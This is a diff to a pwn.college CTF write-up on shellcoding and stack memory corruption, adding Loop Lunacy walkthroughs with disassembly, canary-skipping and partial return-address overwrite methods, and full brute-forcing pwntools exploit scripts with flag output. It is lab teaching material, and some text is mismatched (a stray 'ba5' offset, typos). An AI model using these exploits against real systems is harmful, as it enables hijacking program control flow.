@@ -6,8 +6,6 @@ slug: /pwn-college/program-security/program-security-shellcoding
 
 ## ello ackers!
 
-> Write and execute shellcode to read the flag, but your inputted data is filtered before execution.
-
 ```
 hacker@program-security~ello-ackers:/$ /challenge/ello-ackers 
 ###
@@ -220,8 +218,6 @@ pwn.college{Y0AomWBAdnyjKxZlzES4hSXCoU-.0FMyIDL4ITM0EzW}
 
 ## Syscall Smuggler
 
-> Write and execute shellcode to read the flag, but the inputted data cannot contain any form of system call bytes (syscall, sysenter, int), can you defeat this?
-
 ```
 hacker@program-security~syscall-smuggler:/$ /challenge/syscall-smuggler 
 ###
@@ -383,8 +379,6 @@ pwn.college{4rDXk944HRYc-LzoHZ_apv9MDgT.0VMyIDL4ITM0EzW}
 &nbsp;
 
 ## Syscall Shenanigans
-
->  Write and execute shellcode to read the flag, but the inputted data cannot contain any form of system call bytes (syscall, sysenter, int), this challenge adds an extra layer of difficulty!
 
 ```
 hacker@program-security~syscall-shenanigans:/$ /challenge/syscall-shenanigans 
@@ -581,8 +575,6 @@ pwn.college{ExWjiR3WDqi0KdvDkYToGHFiGhQ.0lMyIDL4ITM0EzW}
 
 ## Byte Budget
 
-> Write and execute shellcode to read the flag, but you only get 18 bytes.
-
 ```
 hacker@program-security~byte-budget:/$ /challenge/byte-budget 
 ###
@@ -696,8 +688,6 @@ pwn.college{04NuaC8j3tSCz0WmiNt4s7uTBXZ.0FNyIDL4ITM0EzW}
 
 ## ClobberCode
 
-> Write and execute shellcode to read the flag, but your input has data inserted into it before being executed.
-
 ```
 hacker@program-security~clobbercode:/$ /challenge/clobbercode 
 ###
@@ -802,8 +792,6 @@ pwn.college{kXvp9dNmYI77jNHDW9Cbj7V6ClS.0VNyIDL4ITM0EzW}
 
 ## Diverse Delivery
 
-> Write and execute shellcode to read the flag, but every byte in your input must be unique.
-
 ```
 hacker@program-security~diverse-delivery:/$ /challenge/diverse-delivery 
 ###
@@ -898,8 +886,6 @@ pwn.college{A3YYHPRU8SL_mu2vpUotvV6C-U3.0FOyIDL4ITM0EzW}
 
 ## Pocket Payload
 
-> Write and execute shellcode to read the flag, but this time you only get 12 bytes!
-
 ```
 hacker@program-security~pocket-payload:/$ /challenge/pocket-payload 
 ###
@@ -992,8 +978,6 @@ pwn.college{kwjklfeOh4LdJaEQD1NDoUm9jr7.0VOyIDL4ITM0EzW}
 
 ## Micro Menace
 
-> Write and execute shellcode to read the flag, but this time you only get 6 bytes :)
-
 ```
 hacker@program-security~micro-menace:/$ /challenge/micro-menace 
 ###
@@ -1054,8 +1038,6 @@ Reading 0x6 bytes from stdin.
 &nbsp;
 
 ## Login Leakage (Easy)
-
-> Leverage memory corruption to satisfy a simple constraint
 
 ```
 hacker@program-security~login-leakage-easy:/$ /challenge/login-leakage-easy 
@@ -1794,8 +1776,6 @@ $
 
 ## Login leakage (Hard)
 
-> Leverage memory corruption to satisfy a simple constraint
-
 ```
 hacker@program-security~login-leakage-hard:/$ /challenge/login-leakage-hard 
 Payload size: 2
@@ -2059,8 +2039,6 @@ $
 &nbsp;
 
 ## Bounds Breaker (Easy)
-
-> Overflow a buffer and smash the stack to obtain the flag, but this time bypass a check designed to prevent you from doing so!
 
 ```
 hacker@program-security~bounds-breaker-easy:~$ /challenge/bounds-breaker-easy 
@@ -2568,8 +2546,6 @@ $
 
 ## Bounds Breaker (Hard)
 
-> Overflow a buffer and smash the stack to obtain the flag, but this time bypass a check designed to prevent you from doing so!
-
 ```
 hacker@program-security~bounds-breaker-hard:~$ /challenge/bounds-breaker-hard 
 ###
@@ -2814,8 +2790,6 @@ $
 &nbsp;
 
 ## Casting Catastrophe (Easy)
-
-> Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from doing so!
 
 ```
 hacker@program-security~casting-catastrophe-easy:~$ /challenge/casting-catastrophe-easy 
@@ -3316,8 +3290,6 @@ $
 
 ## Pointer Problems (Easy)
 
-> Leverage memory corruption to leak the flag.
-
 ```
 hacker@program-security~pointer-problems-easy:~$ /challenge/pointer-problems-easy 
 In this level, the flag will be loaded into the bss section of memory.
@@ -3506,8 +3478,6 @@ $
 &nbsp;
 
 ## Pointer Problems (Hard)
-
-> Leverage memory corruption to leak the flag.
 
 ```
 hacker@program-security~pointer-problems-hard:/$ /challenge/pointer-problems-hard 
@@ -3831,7 +3801,7 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 
 ### Exploit
 
-```py
+```py title="~/script.py" showLineNumbers
 from pwn import *
 import re
 
@@ -3904,8 +3874,6 @@ Goodbye!
 &nbsp;
 
 ## Anomalous Array (Easy)
-
-> Leverage an Array to obtain the flag.
 
 ```
 hacker@program-security~anomalous-array-easy:~$ /challenge/anomalous-array-easy 
@@ -4057,8 +4025,6 @@ Index -488: Found 'zW}\n\x00\x00\x00\x00'
 &nbsp;
 
 ## Anomalous Array (Hard)
-
-> Leverage an Array to obtain the flag.
 
 ```
 hacker@program-security~anomalous-array-hard:/$ /challenge/anomalous-array-hard 
@@ -4477,3 +4443,578 @@ Index -78: Found 'zW}\n\x00\x00\x00\x00'
 ```
 
 &nbsp;
+
+## Loop Lunacy (Easy)
+
+```
+hacker@program-security~loop-lunacy-easy:/$ /challenge/loop-lunacy-easy 
+###
+### Welcome to /challenge/loop-lunacy-easy!
+###
+
+The challenge() function has just been launched!
+Before we do anything, let's take a look at challenge()'s stack frame:
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007fff07372040 (rsp+0x0000) | a0 f6 88 1f 66 78 00 00 | 0x000078661f88f6a0 |
+| 0x00007fff07372048 (rsp+0x0008) | f8 31 37 07 ff 7f 00 00 | 0x00007fff073731f8 |
+| 0x00007fff07372050 (rsp+0x0010) | e8 31 37 07 ff 7f 00 00 | 0x00007fff073731e8 |
+| 0x00007fff07372058 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
+| 0x00007fff07372060 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff07372068 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff07372070 (rsp+0x0030) | 80 20 37 07 ff 7f 00 00 | 0x00007fff07372080 |
+| 0x00007fff07372078 (rsp+0x0038) | 98 20 37 07 ff 7f 00 00 | 0x00007fff07372098 |
+| 0x00007fff07372080 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff07372088 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff07372090 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff07372098 (rsp+0x0058) | 00 00 00 00 42 60 00 00 | 0x0000604200000000 |
+| 0x00007fff073720a0 (rsp+0x0060) | f0 30 37 07 ff 7f 00 00 | 0x00007fff073730f0 |
+| 0x00007fff073720a8 (rsp+0x0068) | 00 81 2b a0 0a db 4f d5 | 0xd54fdb0aa02b8100 |
+| 0x00007fff073720b0 (rsp+0x0070) | f0 30 37 07 ff 7f 00 00 | 0x00007fff073730f0 |
+| 0x00007fff073720b8 (rsp+0x0078) | 3c 91 2e 70 42 60 00 00 | 0x00006042702e913c |
++---------------------------------+-------------------------+--------------------+
+Our stack pointer points to 0x7fff07372040, and our base pointer points to 0x7fff073720b0.
+This means that we have (decimal) 16 8-byte words in our stack frame,
+including the saved base pointer and the saved return address, for a
+total of 128 bytes.
+The input buffer begins at 0x7fff07372080, partway through the stack frame,
+("above" it in the stack are other local variables used by the function).
+Your input will be read into this buffer.
+The buffer is 23 bytes long, but the program will let you provide an arbitrarily
+large input length, and thus overflow the buffer.
+
+In this level, there is no "win" variable.
+You will need to force the program to execute the win_authed() function
+by directly overflowing into the stored return address back to main,
+which is stored at 0x7fff073720b8, 56 bytes after the start of your input buffer.
+That means that you will need to input at least 64 bytes (23 to fill the buffer,
+33 to fill other stuff stored between the buffer and the return address,
+and 8 that will overwrite the return address).
+
+While canaries are enabled, this program reads your input 1 byte at a time,
+tracking how many bytes have been read and the offset from your input buffer
+to read the byte to using a local variable on the stack.
+The code for doing this looks something like:
+    while (n < size) {
+      n += read(0, input + n, 1);
+    }
+As it turns out, you can use this local variable `n` to jump over the canary.
+Your input buffer is stored at 0x7fff07372080, and this local variable `n`
+is stored 24 bytes after it at 0x7fff07372098.
+
+When you overwrite `n`, you will change the program's understanding of
+how many bytes it has read in so far, and when it runs `read(0, input + n, 1)`
+again, it will read into an offset that you control.
+This will allow you to reposition the write *after* the canary, and write
+into the return address!
+
+The payload size is deceptively simple.
+You don't have to think about how many bytes you will end up skipping:
+with the while loop described above, the payload size marks the
+*right-most* byte that will be read into.
+As far as this challenge is concerned, there is no difference between bytes
+"skipped" by fiddling with `n` and bytes read in normally: the values
+of `n` and `size` are all that matters to determine when to stop reading,
+*not* the number of bytes actually read in.
+
+That being said, you *do* need to be careful on the sending side: don't send
+the bytes that you're effectively skipping!
+
+Because the binary is position independent, you cannot know
+exactly where the win_authed() function is located.
+This means that it is not clear what should be written into the return address.
+
+Payload size: 
+```
+
+We have to keep providing a single byte of payload until we reach the address where `n` is stored, which is after 24 bytes.
+Then we have to overwrite the value of `n` with the distance between the buffer address and the saved return address.
+
+Before we craft the exploit, we need the following:
+- [ ] Offset of instruction within `win_authed()` which skips the authentication
+
+### Binary Analysis
+
+```
+pwndbg> disass win_authed 
+Dump of assembler code for function win_authed:
+   0x0000000000001632 <+0>:     endbr64
+   0x0000000000001636 <+4>:     push   rbp
+   0x0000000000001637 <+5>:     mov    rbp,rsp
+   0x000000000000163a <+8>:     sub    rsp,0x10
+   0x000000000000163e <+12>:    mov    DWORD PTR [rbp-0x4],edi
+   0x0000000000001641 <+15>:    cmp    DWORD PTR [rbp-0x4],0x1337
+   0x0000000000001648 <+22>:    jne    0x174c <win_authed+282>
+   0x000000000000164e <+28>:    lea    rdi,[rip+0x1a9b]        # 0x30f0
+  
+# ---- snip ----
+
+   0x000000000000174c <+282>:   nop
+   0x000000000000174d <+283>:   leave
+   0x000000000000174e <+284>:   ret
+End of assembler dump.
+```
+
+- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x164e`
+
+Intbhis exploit we have to partially overwrite the return address.
+
+### Partial return address overwrite
+
+Even if ASLR is enabled, the last 3 nibbles are still fixed, as, in x86-64 a page is a 0x1000 byte slice of memory which is 0x1000 byte aligned.
+
+In the disassembly, we saw that the address of the `win_authed()` function is at an offset of `0x164e` from the page start.
+This means, the `ba5` part will be constant always.
+
+Knowing this, we can keep the LSB constant as the last two nibbles will be accounted for in it.
+However, in the second LSB, one nibble would be constant, and the other would vary.
+
+```
+## ASLR_BASE:                0x00005fda8a580000
+## win_authed() offset:                  0x164e
+=> Final address:            0x00005fda8a58164e
+
+## ASLR_BASE:                0x00005fda8a581000
+## win_authed() offset:                  0x164e
+=> Final address:            0x00005fda8a58264e
+```
+
+If we overwrite the last two bytes of the return address, there is a chance that last two bytes will be the same as the offset of `win_authed()`.
+Some brute-forcing will be required in this challenge.
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+# Set target bytes here (based on win_authed_offset = 0x164e)
+# The 0x16 part is a guess of the 4th nibble. It will work 1/16 times.
+target_bytes = [0x4e, 0x16] 
+
+attempt = 0
+
+while True:
+    attempt += 1
+    p = process('/challenge/loop-lunacy-easy')
+    
+    # Optional: Uncomment the next line to see every byte exchanged
+    # context.log_level = 'debug' 
+
+    buffer_addr = 0x7ffc4f918380
+    addr_of_saved_ip = 0x7ffc4f9183b8
+    var_n_addr = 0x7ffc4f918398
+    win_authed_offset = 0x164e
+
+    total_offset = addr_of_saved_ip - buffer_addr
+    var_n_offset = var_n_addr - buffer_addr
+    jump = total_offset - var_n_offset
+    payload_size = total_offset + 2
+
+    print(f"[+] Attempt {attempt} | Target: {hex(target_bytes[1])}{hex(target_bytes[0])[2:]}")
+
+    try:
+        # 1. Provide size
+        p.recvuntil(b'Payload size:', timeout=2)
+        p.sendline(str(payload_size).encode())
+
+        # 2. Skip to the loop
+        p.recvuntil(b'0 bytes away', timeout=2)
+        p.send(b"A")
+
+        # 3. Fill up to the 'n' variable (offset 24)
+        for i in range(1, var_n_offset):
+            p.recvuntil(f"{i} bytes away".encode(), timeout=2)
+            p.send(b"A")
+
+        # 4. OVERWRITE 'n' to jump to Return Address (offset 56)
+        # We send 55 because n += 1 happens after our write, making n=56
+        p.recvuntil(b"24 bytes away", timeout=2)
+        p.send(p8(total_offset - 1)) 
+
+        # 5. OVERWRITE Return Address
+        p.recvuntil(b"56 bytes away", timeout=2)
+        p.send(p8(target_bytes[0])) # 0x4e
+        
+        p.recvuntil(b"57 bytes away", timeout=2)
+        p.send(p8(target_bytes[1])) # 0x16 
+
+        # 6. CRITICAL: Wait for the flag
+        # We use a loop to check output so we don't close too early
+        output = p.recvall(timeout=1).decode(errors="ignore")
+        
+        if "pwn.college{" in output:
+            print("\n" + "="*30)
+            print("[!!!] FLAG FOUND [!!!]")
+            print(output)
+            print("="*30)
+            break
+        
+        if "Segmentation fault" in output:
+            # This is actually GOOD news. It means you successfully 
+            # redirected execution, but the 4th nibble guess was wrong.
+            pass
+
+    except EOFError:
+        # Process died, likely a segfault from a wrong guess
+        pass
+    except Exception as e:
+        print(f"[!] Error: {e}")
+    finally:
+        p.close()
+```
+
+```
+hacker@program-security~loop-lunacy-easy:/$ python ~/2_script.py 
+[+] Starting local process '/challenge/loop-lunacy-easy': pid 42636
+[+] Attempt 1 | Target: 0x164e
+[+] Receiving all data: Done (2.35KB)
+[*] Process '/challenge/loop-lunacy-easy' stopped with exit code -11 (SIGSEGV) (pid 42636)
+[+] Starting local process '/challenge/loop-lunacy-easy': pid 42639
+[+] Attempt 2 | Target: 0x164e
+[+] Receiving all data: Done (2.35KB)
+[*] Process '/challenge/loop-lunacy-easy' stopped with exit code -11 (SIGSEGV) (pid 42639)
+[+] Starting local process '/challenge/loop-lunacy-easy': pid 42642
+[+] Attempt 3 | Target: 0x164e
+[+] Receiving all data: Done (2.35KB)
+[*] Process '/challenge/loop-lunacy-easy' stopped with exit code -11 (SIGSEGV) (pid 42642)
+[+] Starting local process '/challenge/loop-lunacy-easy': pid 42645
+[+] Attempt 4 | Target: 0x164e
+[+] Receiving all data: Done (2.44KB)
+[*] Process '/challenge/loop-lunacy-easy' stopped with exit code 2 (pid 42645)
+
+==============================
+[!!!] FLAG FOUND [!!!]
+ from the start of the input buffer.
+You sent 58 bytes!
+Let's see what happened with the stack:
+
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007fff071aa400 (rsp+0x0000) | a0 f6 79 8f 44 78 00 00 | 0x000078448f79f6a0 |
+| 0x00007fff071aa408 (rsp+0x0008) | b8 b5 1a 07 ff 7f 00 00 | 0x00007fff071ab5b8 |
+| 0x00007fff071aa410 (rsp+0x0010) | a8 b5 1a 07 ff 7f 00 00 | 0x00007fff071ab5a8 |
+| 0x00007fff071aa418 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
+| 0x00007fff071aa420 (rsp+0x0020) | 00 00 00 00 3a 00 00 00 | 0x0000003a00000000 |
+| 0x00007fff071aa428 (rsp+0x0028) | 3a 00 00 00 00 00 00 00 | 0x000000000000003a |
+| 0x00007fff071aa430 (rsp+0x0030) | 40 a4 1a 07 ff 7f 00 00 | 0x00007fff071aa440 |
+| 0x00007fff071aa438 (rsp+0x0038) | 58 a4 1a 07 ff 7f 00 00 | 0x00007fff071aa458 |
+| 0x00007fff071aa440 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff071aa448 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff071aa450 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff071aa458 (rsp+0x0058) | 3a 00 00 00 5a 55 00 00 | 0x0000555a0000003a |
+| 0x00007fff071aa460 (rsp+0x0060) | b0 b4 1a 07 ff 7f 00 00 | 0x00007fff071ab4b0 |
+| 0x00007fff071aa468 (rsp+0x0068) | 00 a0 f7 dc 9d 6b ef 42 | 0x42ef6b9ddcf7a000 |
+| 0x00007fff071aa470 (rsp+0x0070) | b0 b4 1a 07 ff 7f 00 00 | 0x00007fff071ab4b0 |
+| 0x00007fff071aa478 (rsp+0x0078) | 4e 16 da f1 5a 55 00 00 | 0x0000555af1da164e |
++---------------------------------+-------------------------+--------------------+
+The program's memory status:
+- the input buffer starts at 0x7fff071aa440
+- the saved frame pointer (of main) is at 0x7fff071aa470
+- the saved return address (previously to main) is at 0x7fff071aa478
+- the saved return address is now pointing to 0x555af1da164e.
+- the canary is stored at 0x7fff071aa468.
+- the canary value is now 0x42ef6b9ddcf7a000.
+- the address of the number of bytes read counter and read offset is 0x7fff071aa458.
+- the address of win_authed() is 0x555af1da1632.
+
+If you have managed to overwrite the return address with the correct value,
+challenge() will jump straight to win_authed() when it returns.
+Let's try it now!
+
+Goodbye!
+You win! Here is your flag:
+pwn.college{8UNMXDMBHZ8DpL3em0nucajCFa5.0VNwMDL4ITM0EzW}
+```
+
+&nbsp;
+
+## Loop Lunacy (Hard)
+
+```
+hacker@program-security~loop-lunacy-hard:/$ /challenge/loop-lunacy-hard 
+###
+### Welcome to /challenge/loop-lunacy-hard!
+###
+
+Payload size: 10
+Send your payload (up to 10 bytes)!
+aaaaaaaaaa
+Goodbye!
+### Goodbye!
+```
+
+For exploiting this challenge, we need the followin:
+- [ ] Address of the buffer
+- [ ] Address of variable `n`
+- [ ] Location of stored return address to `main()`
+- [ ] Offset of instruction within `win_authed()` which skips the authentication
+
+### Binary Analysis
+
+
+#### `win_authed()`
+
+Let's get the offset of the required instruction first.
+
+```
+pwndbg> disassemble win_authed
+Dump of assembler code for function win_authed:
+   0x000000000000210c <+0>:     endbr64
+   0x0000000000002110 <+4>:     push   rbp
+   0x0000000000002111 <+5>:     mov    rbp,rsp
+   0x0000000000002114 <+8>:     sub    rsp,0x10
+   0x0000000000002118 <+12>:    mov    DWORD PTR [rbp-0x4],edi
+   0x000000000000211b <+15>:    cmp    DWORD PTR [rbp-0x4],0x1337
+   0x0000000000002122 <+22>:    jne    0x2226 <win_authed+282>
+   0x0000000000002128 <+28>:    lea    rdi,[rip+0xed9]        # 0x3008
+ 
+# ---- snip ----
+
+   0x0000000000002226 <+282>:   nop
+   0x0000000000002227 <+283>:   leave
+   0x0000000000002228 <+284>:   ret
+End of assembler dump.
+```
+
+- [ ] Address of the buffer
+- [ ] Address of variable `n`
+- [ ] Location of stored return address to `main()`
+- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x2128`
+
+
+#### `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+   0x0000000000002229 <+0>:     endbr64
+   0x000000000000222d <+4>:     push   rbp
+   0x000000000000222e <+5>:     mov    rbp,rsp
+   0x0000000000002231 <+8>:     sub    rsp,0xc0
+   0x0000000000002238 <+15>:    mov    DWORD PTR [rbp-0xa4],edi
+   0x000000000000223e <+21>:    mov    QWORD PTR [rbp-0xb0],rsi
+   0x0000000000002245 <+28>:    mov    QWORD PTR [rbp-0xb8],rdx
+   0x000000000000224c <+35>:    mov    rax,QWORD PTR fs:0x28
+   0x0000000000002255 <+44>:    mov    QWORD PTR [rbp-0x8],rax
+   0x0000000000002259 <+48>:    xor    eax,eax
+   0x000000000000225b <+50>:    lea    rdx,[rbp-0x80]
+   0x000000000000225f <+54>:    mov    eax,0x0
+   0x0000000000002264 <+59>:    mov    ecx,0xe
+   0x0000000000002269 <+64>:    mov    rdi,rdx
+   0x000000000000226c <+67>:    rep stos QWORD PTR es:[rdi],rax
+   0x000000000000226f <+70>:    lea    rax,[rbp-0x80]
+   0x0000000000002273 <+74>:    mov    QWORD PTR [rbp-0x90],rax
+   0x000000000000227a <+81>:    lea    rax,[rbp-0x80]
+   0x000000000000227e <+85>:    add    rax,0x6c
+   0x0000000000002282 <+89>:    mov    QWORD PTR [rbp-0x88],rax
+   0x0000000000002289 <+96>:    mov    QWORD PTR [rbp-0x98],0x0
+   0x0000000000002294 <+107>:   lea    rdi,[rip+0xe71]        # 0x310c
+   0x000000000000229b <+114>:   mov    eax,0x0
+   0x00000000000022a0 <+119>:   call   0x1160 <printf@plt>
+   0x00000000000022a5 <+124>:   lea    rax,[rbp-0x98]
+   0x00000000000022ac <+131>:   mov    rsi,rax
+   0x00000000000022af <+134>:   lea    rdi,[rip+0xe65]        # 0x311b
+   0x00000000000022b6 <+141>:   mov    eax,0x0
+   0x00000000000022bb <+146>:   call   0x11b0 <__isoc99_scanf@plt>
+   0x00000000000022c0 <+151>:   mov    rax,QWORD PTR [rbp-0x98]
+   0x00000000000022c7 <+158>:   mov    rsi,rax
+   0x00000000000022ca <+161>:   lea    rdi,[rip+0xe4f]        # 0x3120
+   0x00000000000022d1 <+168>:   mov    eax,0x0
+   0x00000000000022d6 <+173>:   call   0x1160 <printf@plt>
+   0x00000000000022db <+178>:   jmp    0x231b <challenge+242>
+   0x00000000000022dd <+180>:   mov    rax,QWORD PTR [rbp-0x88]
+   0x00000000000022e4 <+187>:   mov    eax,DWORD PTR [rax]
+   0x00000000000022e6 <+189>:   movsxd rdx,eax
+   0x00000000000022e9 <+192>:   mov    rax,QWORD PTR [rbp-0x90]
+   0x00000000000022f0 <+199>:   add    rax,rdx
+   0x00000000000022f3 <+202>:   mov    edx,0x1
+   0x00000000000022f8 <+207>:   mov    rsi,rax
+   0x00000000000022fb <+210>:   mov    edi,0x0
+   0x0000000000002300 <+215>:   call   0x1180 <read@plt>
+   0x0000000000002305 <+220>:   mov    rdx,QWORD PTR [rbp-0x88]
+   0x000000000000230c <+227>:   mov    edx,DWORD PTR [rdx]
+   0x000000000000230e <+229>:   add    eax,edx
+   0x0000000000002310 <+231>:   mov    edx,eax
+   0x0000000000002312 <+233>:   mov    rax,QWORD PTR [rbp-0x88]
+   0x0000000000002319 <+240>:   mov    DWORD PTR [rax],edx
+   0x000000000000231b <+242>:   mov    rax,QWORD PTR [rbp-0x88]
+   0x0000000000002322 <+249>:   mov    eax,DWORD PTR [rax]
+   0x0000000000002324 <+251>:   movsxd rdx,eax
+   0x0000000000002327 <+254>:   mov    rax,QWORD PTR [rbp-0x98]
+   0x000000000000232e <+261>:   cmp    rdx,rax
+   0x0000000000002331 <+264>:   jb     0x22dd <challenge+180>
+   0x0000000000002333 <+266>:   mov    rax,QWORD PTR [rbp-0x88]
+   0x000000000000233a <+273>:   mov    eax,DWORD PTR [rax]
+   0x000000000000233c <+275>:   mov    DWORD PTR [rbp-0x9c],eax
+   0x0000000000002342 <+281>:   cmp    DWORD PTR [rbp-0x9c],0x0
+   0x0000000000002349 <+288>:   jns    0x2377 <challenge+334>
+   0x000000000000234b <+290>:   call   0x1120 <__errno_location@plt>
+   0x0000000000002350 <+295>:   mov    eax,DWORD PTR [rax]
+   0x0000000000002352 <+297>:   mov    edi,eax
+   0x0000000000002354 <+299>:   call   0x11d0 <strerror@plt>
+   0x0000000000002359 <+304>:   mov    rsi,rax
+   0x000000000000235c <+307>:   lea    rdi,[rip+0xde5]        # 0x3148
+   0x0000000000002363 <+314>:   mov    eax,0x0
+   0x0000000000002368 <+319>:   call   0x1160 <printf@plt>
+   0x000000000000236d <+324>:   mov    edi,0x1
+   0x0000000000002372 <+329>:   call   0x11c0 <exit@plt>
+   0x0000000000002377 <+334>:   lea    rdi,[rip+0xdee]        # 0x316c
+   0x000000000000237e <+341>:   call   0x1130 <puts@plt>
+   0x0000000000002383 <+346>:   mov    eax,0x0
+   0x0000000000002388 <+351>:   mov    rcx,QWORD PTR [rbp-0x8]
+   0x000000000000238c <+355>:   xor    rcx,QWORD PTR fs:0x28
+   0x0000000000002395 <+364>:   je     0x239c <challenge+371>
+   0x0000000000002397 <+366>:   call   0x1150 <__stack_chk_fail@plt>
+   0x000000000000239c <+371>:   leave
+   0x000000000000239d <+372>:   ret
+End of assembler dump.
+```
+
+We can see that the buffer is at `rbp-0x80` based on these instructions where the program clears the buffer.
+
+```
+# ---- snip ----
+
+   0x0000000000002259 <+48>:    xor    eax,eax
+   0x000000000000225b <+50>:    lea    rdx,[rbp-0x80]
+   0x000000000000225f <+54>:    mov    eax,0x0
+   0x0000000000002264 <+59>:    mov    ecx,0xe
+   0x0000000000002269 <+64>:    mov    rdi,rdx
+   0x000000000000226c <+67>:    rep stos QWORD PTR es:[rdi],rax
+
+# ---- snip ----
+```
+
+- [x] Address of the buffer: `rbp-0x80`
+- [ ] Address of variable `n`
+- [ ] Location of stored return address to `main()`
+- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x2128`
+
+Further in the program, there is this algorithm:
+
+```
+# ---- snip ----
+
+   0x000000000000227a <+81>:    lea    rax,[rbp-0x80]
+   0x000000000000227e <+85>:    add    rax,0x6c
+   0x0000000000002282 <+89>:    mov    QWORD PTR [rbp-0x88],rax
+
+# ---- snip ----   
+
+   0x00000000000022dd <+180>:   mov    rax,QWORD PTR [rbp-0x88]
+   0x00000000000022e4 <+187>:   mov    eax,DWORD PTR [rax]
+   0x00000000000022e6 <+189>:   movsxd rdx,eax
+   0x00000000000022e9 <+192>:   mov    rax,QWORD PTR [rbp-0x90]
+   0x00000000000022f0 <+199>:   add    rax,rdx
+   0x00000000000022f3 <+202>:   mov    edx,0x1
+   0x00000000000022f8 <+207>:   mov    rsi,rax
+   0x00000000000022fb <+210>:   mov    edi,0x0
+   0x0000000000002300 <+215>:   call   0x1180 <read@plt>
+
+# ---- snip ----
+```
+
+- [x] Address of the buffer:: `rbp - 0x80`
+- [x] Address of variable `n`: `rbp - 0x80 + 0x6c`
+- [x] Location of stored return address to `main()`: `rbp - 0x8`
+- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x2128`
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+# Based on your win_authed_offset = 0x2128
+target_bytes = [0x28, 0x21] 
+
+attempt = 0
+
+while True:
+    attempt += 1
+    # Update binary path to hard mode
+    p = process('/challenge/loop-lunacy-hard')
+    
+    # Updated hardcoded addresses from your prompt
+    buffer_addr = - 0x80      # rbp - 128
+    var_n_addr = - 0x80 + 0x6c      # rbp - 20 (This is -0x80 + 0x6c)
+    addr_of_saved_ip = 0x8   # rbp + 8
+    
+    # Calculate distances
+    # Note: if var_n_addr < buffer_addr, the offset is negative!
+    # Python's p8() handles signed integers, but let's calculate carefully.
+    total_offset = addr_of_saved_ip - buffer_addr
+    # total_offset = 136
+    var_n_offset = var_n_addr - buffer_addr
+    # var_n_offset = 108
+    payload_size = total_offset + 2
+
+    print(f"[+] Attempt {attempt} | Offsets: n={var_n_offset}, ret={total_offset}")
+
+    try:
+        # 1. Provide size
+        p.recvuntil(b'Payload size:', timeout=2)
+        p.sendline(str(payload_size).encode())
+
+        # 2. Wait for the start signal
+        p.recvuntil(b'Send your payload', timeout=2)
+
+        # 3. Handle negative offsets if necessary
+        # If var_n is BEFORE the buffer (common in 'hard'), 
+        # the program might start at n=0.
+        # We need to send exactly (var_n_offset) bytes to reach 'n'.
+        # However, if var_n is at a negative offset, you likely need 
+        # to enter a payload size that wraps around or use a specific starting 'n'.
+        
+        # ASSUMING n starts at 0 and we need to reach var_n_offset:
+        # Fill everything up to 'n'
+        p.send(b"A" * var_n_offset)
+
+        # 4. OVERWRITE 'n' to jump to Return Address
+        # We send the byte that makes the NEXT read happen at total_offset
+        p.send(p8(total_offset - 1)) 
+
+        # 5. OVERWRITE Return Address
+        # Immediately send the target bytes. The program will read these
+        # as soon as it updates 'n' to the total_offset value.
+        p.send(p8(target_bytes[0])) 
+        p.send(p8(target_bytes[1])) 
+
+        # 6. Wait for the flag
+        output = p.recvall(timeout=1).decode(errors="ignore")
+        
+        if "pwn.college{" in output:
+            print("\n" + "="*30)
+            print("[!!!] FLAG FOUND [!!!]")
+            print(output)
+            print("="*30)
+            break
+
+    except Exception as e:
+        print(f"[!] Error: {e}")
+    finally:
+        p.close()
+```
+
+```
+hacker@program-security~loop-lunacy-hard:/$ python ~/2_script.py 
+[+] Starting local process '/challenge/loop-lunacy-hard': pid 25159
+[+] Attempt 1 | Offsets: n=108, ret=136
+[+] Receiving all data: Done (29B)
+[*] Process '/challenge/loop-lunacy-hard' stopped with exit code -11 (SIGSEGV) (pid 25159)
+[+] Starting local process '/challenge/loop-lunacy-hard': pid 25162
+
+# ---- snip ----
+
+[+] Attempt 13 | Offsets: n=108, ret=136
+[+] Receiving all data: Done (116B)
+[*] Process '/challenge/loop-lunacy-hard' stopped with exit code 2 (pid 25195)
+
+==============================
+[!!!] FLAG FOUND [!!!]
+ (up to 138 bytes)!
+Goodbye!
+You win! Here is your flag:
+pwn.college{UokbkvbtuMwdJiQwJAWD0ItCYFx.0lNwMDL4ITM0EzW}
+```
